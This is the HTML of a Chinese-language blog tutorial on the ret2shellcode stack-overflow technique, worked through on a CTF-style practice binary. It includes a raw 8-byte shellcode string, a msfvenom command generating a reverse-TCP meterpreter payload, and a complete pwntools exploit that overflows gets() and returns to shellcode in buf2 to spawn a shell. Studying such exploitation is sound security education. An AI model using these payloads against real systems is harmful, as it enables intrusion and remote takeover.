@@ -1,0 +1,880 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='栈里混入了奇怪的东西...'><title>PWN! PWN! PANG! Part5 --- ret2shellcode</title>
+
+<link rel='canonical' href='https://kira-pgr.github.io/zh-cn/p/pwn-pwn-pang-part5---ret2shellcode/'>
+
+<link rel="stylesheet" href="/scss/style.min.ac77dcf8b111b51da39a92990f431923f210f3876d85798a2125667f96dc33a4.css"><meta property='og:title' content='PWN! PWN! PANG! Part5 --- ret2shellcode'>
+<meta property='og:description' content='栈里混入了奇怪的东西...'>
+<meta property='og:url' content='https://kira-pgr.github.io/zh-cn/p/pwn-pwn-pang-part5---ret2shellcode/'>
+<meta property='og:site_name' content='猫猫の博客'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='PWN' /><meta property='article:published_time' content='2022-03-03T05:50:08-05:00'/><meta property='article:modified_time' content='2022-03-03T05:50:08-05:00'/><meta property='og:image' content='https://kira-pgr.github.io/zh-cn/p/pwn-pwn-pang-part5---ret2shellcode/cover.jpg' />
+<meta name="twitter:title" content="PWN! PWN! PANG! Part5 --- ret2shellcode">
+<meta name="twitter:description" content="栈里混入了奇怪的东西..."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://kira-pgr.github.io/zh-cn/p/pwn-pwn-pang-part5---ret2shellcode/cover.jpg' /><head>
+    <style>
+ .blur {
+   color: transparent;
+   text-shadow:0px 0px 8px rgba(0,0,0,0.5)
+}
+
+.blur:hover {
+   color: transparent;
+   text-shadow:0px 0px 0px rgba(0,0,0,1)
+
+}
+
+.shady {
+   color:#000;
+   font-weight: bold;
+   box-shadow: 0px -20px 0px rgba(0,0,0,1) inset; 
+   transition: all 0.3s ease;
+}
+.shady:hover{
+  font-weight: bold;
+   color:#FFF;
+   box-shadow: 0px -20px 0px rgba(0,0,0,1) inset; 
+}
+</style>
+</head>
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/zh-cn/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu6303347a79895c67737217ae3756b054_237429_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/zh-cn">猫猫の博客</a></h1>
+            <h2 class="site-description">Cat, but learning CS</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Kira-Pgr'
+                        target="_blank"
+                        title="GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/zh-cn/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/zh-cn/%E5%85%B3%E4%BA%8E%E6%9C%AC%E5%96%B5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于本喵</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/zh-cn/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>猫の存档</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/zh-cn/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>猫の搜索</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/zh-cn/%E7%8C%AB%E3%81%AE%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>猫の链接</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+                <li id="i18n-switch">  
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
+                        
+                            <option value="https://kira-pgr.github.io/" >English</option>
+                        
+                            <option value="https://kira-pgr.github.io/zh-cn/" selected>中文</option>
+                        
+                    </select>
+                </li>
+            
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>暗色模式</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/zh-cn/p/pwn-pwn-pang-part5---ret2shellcode/">
+                <img src="/zh-cn/p/pwn-pwn-pang-part5---ret2shellcode/cover_hu3166df2cafdca7684e1b9dcf3608c6c9_2294292_800x0_resize_q75_box.jpg"
+                        srcset="/zh-cn/p/pwn-pwn-pang-part5---ret2shellcode/cover_hu3166df2cafdca7684e1b9dcf3608c6c9_2294292_800x0_resize_q75_box.jpg 800w, /zh-cn/p/pwn-pwn-pang-part5---ret2shellcode/cover_hu3166df2cafdca7684e1b9dcf3608c6c9_2294292_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="639" 
+                        loading="lazy"
+                        alt="Featured image of post PWN! PWN! PANG! Part5 --- ret2shellcode" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/zh-cn/categories/security/" >
+                Security
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/zh-cn/p/pwn-pwn-pang-part5---ret2shellcode/">PWN! PWN! PANG! Part5 --- ret2shellcode</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            栈里混入了奇怪的东西...
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 03, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 1 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="pwn-pwn-pang-part5">PWN! PWN! PANG! Part5</h1>
+<p>呼～～好久没有继续更新PWN笔记了 <del>(最近学的Web安全的笔记也没写  逃)</del></p>
+<h2 id="资料投放">资料投放</h2>
+<p>老规矩，开头上资料= =</p>
+<p><a class="link" href="https://mimiksworkshop-my.sharepoint.com/:u:/g/personal/kirapgr_mimiksworkshop_onmicrosoft_com/ERCQKjILLYdJq3hdJTJ0s0kBberJTRKHvXQ25PYHuS-8bQ?e=P2cDdb"  target="_blank" rel="noopener"
+    >ret2shellcode</a></p>
+<h2 id="shellcode">ShellCode</h2>
+<p>既然今天的话题叫做ret2shellcode,我们先来了解一下<strong>ShellCode</strong></p>
+<h3 id="什么是shellcode">什么是ShellCode</h3>
+<p>shellcode是一段用于利用软件漏洞而执行的代码，也可以认为是一段填充数据，shellcode为16进制的机器码，因为经常让攻击者<strong>获得shell</strong>而得名。shellcode常常使用机器语言编写</p>
+<h3 id="如何获取shellcode">如何获取ShellCode</h3>
+<p>获取ShellCode有很多种方法，这里简单介绍几种</p>
+<h4 id="利用pwntools自带函数">利用PWNTools自带函数</h4>
+<p>首先设置<strong>目标程序</strong> 的参数</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span><span class="c1"># os指操作系统，这里是Linux</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># arch指架构，64位一般是amd64，32位一般是i386</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># log_level指日志输出的等级，debug为调试模式</span>
+</span></span></code></pre></div><p>然后用<code>shellcraft.sh()</code>函数获取ShellCode的<strong>汇编代码</strong>，再调用<code>asm()</code>变成机器码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+</span></span></code></pre></div><h4 id="网上找现成的shellcode">网上找现成的ShellCode</h4>
+<p><a class="link" href="http://shell-storm.org/shellcode/"  target="_blank" rel="noopener"
+    >ShellStorm: 一个国外ShellCode集合</a></p>
+<p>ShellStorm中包含多种平台，多种长度，多种功能的ShellCode</p>
+<blockquote>
+<p>为什么ShellCode会考虑长度？</p>
+<p>答: 有时候栈中填入的ShellCode有长度限制</p>
+</blockquote>
+<p>这里举个例子，只有8字节的ShellCode</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="s2">&#34;\x99\x6a\x0b\x58\x60\x59\xcd\x80&#34;</span>
+</span></span></code></pre></div><h4 id="metasploit">metasploit</h4>
+<p>想要一个功能更强大且不想要网上到处找？</p>
+<p>MSF的<code>meterpreter</code>你绝对喜欢</p>
+<p>生成ShellCode命令</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;Local IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;Local Port&gt; -f &lt;language&gt;
+</span></span></code></pre></div><h4 id="自己写">自己写</h4>
+<p>建议新手采用前几种方案，要是各位有兴趣自己写ShellCode的话可以参考这个<a class="link" href="https://www.exploit-db.com/docs/english/13610-building-your-own-ud-shellcodes-part-1.pdf"  target="_blank" rel="noopener"
+    >PDF</a></p>
+<h2 id="pwn-pwn-pang">PWN! PWN! PANG?</h2>
+<p>本题思路和ret2text大体差不多，差别主要在返回地址上，ret2text是返回到text段的后门函数，而本次的ret2shellcode是返回到ShellCode</p>
+<p>大家可以先自己试试再看下面的思路分析.QwQ.</p>
+<p>大概先提几点提示:</p>
+<ul>
+<li>
+<p>ShellCode写入哪里呢？</p>
+</li>
+<li>
+<p>ShellCode的地址是什么？</p>
+</li>
+</ul>
+<h2 id="ret2shellcode">ret2shellcode</h2>
+<p>先<code>checksec</code>一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ checksec ret2shellcode
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/pwn/桌面/ROP/ret2shellcode&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX disabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    RWX:      Has RWX segments
+</span></span></code></pre></div><p>看到这个32位程序NX是关闭的，而且有同时可以读，写，执行的段(也就是栈)，我们想到可以把ShellCode写入栈中，并通过栈溢出返回到栈中的ShellCode</p>
+<p><strong>但是，我们貌似忽视了一个重要的问题</strong></p>
+<p>目标机一般都是完全打开<strong>ASLR</strong>，也就意味着每次运行程序时，组件(包括堆栈，堆和库)都将移至虚拟内存中的其他地址。 我们无法通过反复试验来了解目标所在，因为每次的地址都会不同。</p>
+<p>因此，很显然我们并不能找到ShellCode的地址，也就没办法返回到栈上的ShellCode</p>
+<p><img src="/zh-cn/p/pwn-pwn-pang-part5---ret2shellcode/1.jpg"
+	width="570"
+	height="679"
+	srcset="/zh-cn/p/pwn-pwn-pang-part5---ret2shellcode/1_hucc68de3fc1d99772bd162ef606edf282_348427_480x0_resize_q75_box.jpg 480w, /zh-cn/p/pwn-pwn-pang-part5---ret2shellcode/1_hucc68de3fc1d99772bd162ef606edf282_348427_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="啊哦，行不通了= ="
+	
+	
+		class="gallery-image" 
+		data-flex-grow="83"
+		data-flex-basis="201px"
+	
+></p>
+<hr>
+<p>当然，如果各位想尝试一下上面的思路的话，<strong>直接将ASLR关闭即可</strong></p>
+<p>该利用姿势<strong>ret2stack</strong>大家可以查看<a class="link" href="https://www.bilibili.com/read/cv14181790"  target="_blank" rel="noopener"
+    >我朋友BlackRabbit的文章</a></p>
+<p>记得留个关注呐 .QwQ.</p>
+<hr>
+<h3 id="反汇编分析">反汇编分析</h3>
+<p>查看主函数反编译出的C代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span> <span class="c1">// [esp+1Ch] [ebp-64h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;No system for you this time !!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">gets</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">strncpy</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mh">0x64u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;bye bye ~&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>我们可以看出这里通过<code>gets()</code>读入了数组<code>s</code>,并把数组<code>s</code>的值传给了<code>buf2</code>，而这个<code>buf2</code>位于<code>.bss</code>节(看起来应该是一个全局变量)</p>
+<p>想到这里，我们<strong>不禁露出了恶毒的笑容</strong></p>
+<p>我们在数组<code>s</code>中读入的shellcode会被程序同时放在<code>buf2</code>中，这样我们通过溢出数组s,把</p>
+<p><code>main</code>函数的返回地址覆盖成<code>buf2</code>的地址即可</p>
+<p><img src="/zh-cn/p/pwn-pwn-pang-part5---ret2shellcode/2.jpg"
+	width="622"
+	height="696"
+	srcset="/zh-cn/p/pwn-pwn-pang-part5---ret2shellcode/2_hue7be457f48e13f9d356491fa28fefd38_391390_480x0_resize_q75_box.jpg 480w, /zh-cn/p/pwn-pwn-pang-part5---ret2shellcode/2_hue7be457f48e13f9d356491fa28fefd38_391390_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="思路.QAQ."
+	
+	
+		class="gallery-image" 
+		data-flex-grow="89"
+		data-flex-basis="214px"
+	
+></p>
+<h2 id="exploit">Exploit</h2>
+<p>通过gdb调试该程序发现在返回地址前需数据112字节</p>
+<blockquote>
+<p>gdb调试在这里不再演示了，不会的可以查看<a class="link" href="https://kira-pgr.github.io/posts/pwn4/#%E7%B2%BE%E5%BF%83%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E6%95%B0%E6%8D%AE"  target="_blank" rel="noopener"
+    >上一篇文章</a></p>
+</blockquote>
+<p>但由于我们还需要写入ShellCode，我们必须选一个<strong>小于等于112字节</strong>的ShellCode,并把<strong>不足</strong>112字节的部分用<strong>垃圾数据填充</strong></p>
+<p>由此写出EXP:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;ret2shellcode&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ret2shellcode&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">112</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;buf2&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#shellcode.ljust(112,b&#39;A&#39;)指shellcode不够112字节的地方用A填充</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><h2 id="ref">Ref</h2>
+<p><a class="link" href="https://blog.csdn.net/weixin_43916678/article/details/107181228"  target="_blank" rel="noopener"
+    >https://blog.csdn.net/weixin_43916678/article/details/107181228</a></p>
+<p><a class="link" href="https://blog.csdn.net/qq_35495684/article/details/79583232"  target="_blank" rel="noopener"
+    >https://blog.csdn.net/qq_35495684/article/details/79583232</a></p>
+<p><a class="link" href="https://notchxor.github.io/oscp-notes/8-cheatsheets/msfvenom/"  target="_blank" rel="noopener"
+    >https://notchxor.github.io/oscp-notes/8-cheatsheets/msfvenom/</a></p>
+<p><a class="link" href="https://www.bilibili.com/read/cv14181790"  target="_blank" rel="noopener"
+    >https://www.bilibili.com/read/cv14181790</a></p>
+<p><a class="link" href="https://blog.csdn.net/culinxia2707/article/details/108788113"  target="_blank" rel="noopener"
+    >https://blog.csdn.net/culinxia2707/article/details/108788113</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/zh-cn/tags/pwn/">PWN</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/zh-cn/p/pwn-pwn-pang-part6---rop/">
+        
+        
+            <div class="article-image">
+                <img src="/zh-cn/p/pwn-pwn-pang-part6---rop/cover.9ce3629f5f54def41971d23600c4a453_hu76ffa02a199d8318bcf8bc7fd89975bb_336695_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PWN! PWN! PANG! Part6 --- ROP"
+                        
+                        data-hash="md5-nONin19U3vQZcdI2AMSkUw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PWN! PWN! PANG! Part6 --- ROP</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/zh-cn/p/pwn-pwn-pang-part4---ret2text/">
+        
+        
+            <div class="article-image">
+                <img src="/zh-cn/p/pwn-pwn-pang-part4---ret2text/cover.959f4e2e5300435dc53c019e930d261b_hudfa7423162da6f5e14fd4e8a1ac3231a_749576_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PWN! PWN! PANG! Part4 --- ret2text"
+                        
+                        data-hash="md5-lZ9OLlMAQ13FPAGekw0mGw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PWN! PWN! PANG! Part4 --- ret2text</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/zh-cn/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/">
+        
+        
+            <div class="article-image">
+                <img src="/zh-cn/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/cover.83e414d02bfc9f736e824b7f6cd9a9eb_huc93e8e51211b13db7df27f880625afbe_1479136_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PWN! PWN! PANG! Part3 --- 栈溢出基础"
+                        
+                        data-hash="md5-g&#43;QU0Cv8n3Nugkt/bNmp6w==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PWN! PWN! PANG! Part3 --- 栈溢出基础</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/zh-cn/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/">
+        
+        
+            <div class="article-image">
+                <img src="/zh-cn/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/cover.dfc14371a1ebc11e7a4c671f0b6a9755_hu3d6209426f4a4882dd231c4242aff084_2839967_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PWN! PWN! PANG! Part2 --- 工具的使用"
+                        
+                        data-hash="md5-38FDcaHrwR56TGcfC2qXVQ==">
+                
+            </div>
+        
+
